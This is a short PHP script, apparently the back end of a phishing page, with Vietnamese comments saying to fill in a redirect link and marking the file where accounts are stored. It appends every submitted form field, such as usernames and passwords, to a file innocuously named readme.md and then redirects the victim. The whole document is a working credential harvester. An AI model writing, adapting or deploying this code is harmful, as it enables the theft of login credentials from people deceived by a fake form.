<?php
header("Location: http:// "); //nhập link các bạn muốn chuyển đến 
$handle = fopen("readme.md", "a");//nơi lưu tài khoản
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
